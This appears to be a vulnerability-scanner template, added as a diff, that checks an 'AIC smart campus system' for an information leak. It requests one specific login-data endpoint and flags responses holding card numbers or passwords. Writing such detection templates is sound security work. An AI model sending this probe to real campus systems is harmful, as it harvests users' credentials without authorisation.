@@ -1,0 +1,23 @@
+id: AIC-leakage
+
+info:
+  name: AIC智能校园系统信息泄露漏洞
+  author: Str1am
+  severity: high
+  tags: AIC,leakage
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/datacenter/dataOrigin.ashx?c=login"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "卡号"
+          - "密码"
+        part: body
+        condition: or
